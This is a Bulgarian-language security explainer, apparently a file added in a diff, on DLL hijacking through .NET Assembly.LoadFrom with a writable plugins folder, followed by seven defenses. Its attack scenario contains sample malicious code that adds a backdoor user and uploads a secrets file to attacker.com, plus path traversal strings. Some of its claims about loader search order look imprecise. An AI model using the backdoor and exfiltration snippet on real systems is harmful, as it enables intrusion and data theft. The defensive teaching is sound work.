@@ -1,0 +1,204 @@
+﻿  ЗАЩО Assembly.LoadFrom + writable plugins dir Е ОПАСНО
+
+ПРОБЛЕМ: DLL/Assembly Hijacking
+
+Когато използваме Assembly.LoadFrom() с writable plugins директория, атакуващ
+може да подмени легитимни DLL файлове със злонамерени версии.
+
+
+СЦЕНАРИЙ НА АТАКА:
+
+Стъпка 1: Нормална ситуация
+plugins/
+  - LoggerPlugin.dll  (легитимен plugin)
+
+Host код:
+  Assembly.LoadFrom("plugins\\LoggerPlugin.dll")
+
+LoggerPlugin.dll използва:
+  - using System;
+  - using System.IO;
+
+Резултат: Работи нормално
+
+
+Стъпка 2: Атакуващ има write достъп
+Атакуващ създава злонамерени DLL файлове:
+
+plugins/
+  - LoggerPlugin.dll       (оригинален - легитимен)
+  - System.dll             (MALICIOUS - създаден от атакуващ)
+  - System.IO.dll          (MALICIOUS)
+  - mscorlib.dll           (MALICIOUS)
+
+
+Стъпка 3: .NET Assembly Loading
+Когато LoggerPlugin.dll се зарежда, той търси dependencies (System.dll).
+
+.NET търси в следния ред:
+  1. GAC (Global Assembly Cache)
+  2. Application base directory
+  3. ТЕКУЩА ДИРЕКТОРИЯ <- ПРОБЛЕМЪТ Е ТУК
+  4. Private paths
+
+Ако plugins\ е текуща директория:
+  - .NET намира plugins\System.dll ПЪРВО
+  - Зарежда MALICIOUS System.dll вместо real System.dll
+  - RCE (Remote Code Execution)
+
+
+Стъпка 4: Какво се случва
+--------------------------
+Malicious System.dll съдържа:
+
+public class String {
+    static String() {  // Изпълнява се автоматично при load
+        Process.Start("cmd.exe", "/c net user hacker Pass123 /add");
+        var secrets = File.ReadAllText(@"C:\secrets\secret.txt");
+        new WebClient().UploadString("http://attacker.com", secrets);
+    }
+}
+
+Резултат:
+  - Създава backdoor потребител с admin права
+  - Краде secrets
+  - Атакуващ има пълен контрол
+
+
+ЗАЩО Е ТОЛКОВА ОПАСНО:
+-------------------------------------------------------------------------------
+
+- STEALTH: Изглежда като легитимен System.dll, антивирус не го засича
+- PERSISTENCE: Изпълнява се всеки път при старт на host
+- PRIVILEGE ESCALATION: Ако host работи като SYSTEM, malicious код също
+- HARD TO DETECT: File name е правилен, location изглежда нормално
+
+
+РЕШЕНИЕ:
+
+ЗАЩИТА 1: Full Path Loading
+Опасно:
+  Assembly.LoadFrom("LoggerPlugin.dll")
+  // Търси в текуща директория
+
+Сигурно:
+  string fullPath = Path.Combine(
+      Path.GetFullPath("plugins"),
+      "LoggerPlugin.dll");
+  Assembly.LoadFrom(fullPath);  // Точен път
+
+Защо работи:
+  - Не разчита на search path
+  - Зарежда ТОЧНО този файл
+
+
+ЗАЩИТА 2: Path Traversal Protection
+string fullPath = Path.Combine(pluginDir, pluginName);
+
+if (!fullPath.StartsWith(pluginDir)) {
+    Console.WriteLine("BLOCKED: Path traversal");
+    return;
+}
+
+Блокира:
+  - "../../Windows/System32/evil.dll"
+  - "..\..\..\malicious.dll"
+
+
+ЗАЩИТА 3: Whitelist (най-важна)
+static readonly string[] ALLOWED_PLUGINS = {
+    "LoggerPlugin.dll"
+};
+
+foreach (var allowedPlugin in ALLOWED_PLUGINS) {
+    // Load only whitelisted
+}
+
+Дори ако атакуващ създаде:
+  - plugins\System.dll -> НЕ е в whitelist -> IGNORED
+  - plugins\Malicious.dll -> НЕ е в whitelist -> IGNORED
+
+Зарежда се САМО LoggerPlugin.dll
+
+
+ЗАЩИТА 4: Strong Name Signature
+var assemblyName = AssemblyName.GetAssemblyName(pluginPath);
+byte[] publicKeyToken = assemblyName.GetPublicKeyToken();
+
+if (publicKeyToken == null || publicKeyToken.Length == 0) {
+    Console.WriteLine("BLOCKED: Unsigned");
+    return;
+}
+
+Атакуващ НЕ може да подпише DLL с нашия private key
+
+
+ЗАЩИТА 5: File Hash Verification
+using (var sha256 = SHA256.Create()) {
+    byte[] hash = sha256.ComputeHash(File.OpenRead(pluginPath));
+    
+    if (hashString != EXPECTED_HASH) {
+        Console.WriteLine("BLOCKED: File modified");
+        return;
+    }
+}
+
+Ако атакуващ подмени файла -> hash се променя -> засичане
+
+
+ЗАЩИТА 6: Read-Only Directory
+Команда:
+  icacls plugins /inheritance:r
+  icacls plugins /grant Administrators:(OI)(CI)F
+  icacls plugins /deny Users:(OI)(CI)W
+
+Резултат:
+  - Обикновен потребител НЕ може да пише в plugins\
+  - НЕ може да създаде malicious System.dll
+  - Атаката е блокирана на file system ниво
+
+
+ЗАЩИТА 7: Process Isolation
+----------------------------
+Дори ако malicious DLL се зареди:
+  - Plugin работи в отделен процес (PluginExecutor.exe)
+  - НЕ може да достъпва host паметта
+  - Job Objects ограничават ресурсите
+
+
+СРАВНЕНИЕ:
+
+Vulnerable версия:
+  - Assembly.LoadFrom("plugin.dll")
+  - Writable plugins директория
+  - Няма whitelist
+  - Няма signature check
+  - Same process execution
+  - DLL hijacking ВЪЗМОЖНА
+
+Secure версия:
+  - Full path loading
+  - Read-only ACLs
+  - Whitelist - само одобрени
+  - Strong name verification
+  - Hash verification
+  - Separate process (sandbox)
+  - DLL hijacking БЛОКИРАНА
+
+
+Обобщено :
+
+Assembly.LoadFrom + writable plugins dir е опасно защото:
+  - Атакуващ може да подмени dependency DLLs
+  - .NET зарежда от текуща директория ПЪРВО
+  - Malicious код се изпълнява автоматично
+  - Трудно за засичане
+
+Решение:
+  - Full path loading (не разчита на search path)
+  - Whitelist (зарежда САМО одобрени файлове)
+  - Signatures (проверява автентичност)
+  - Hash (проверява integrity)
+  - Read-only ACLs (блокира write)
+  - Process isolation (ограничена щета при компрометиране)
+
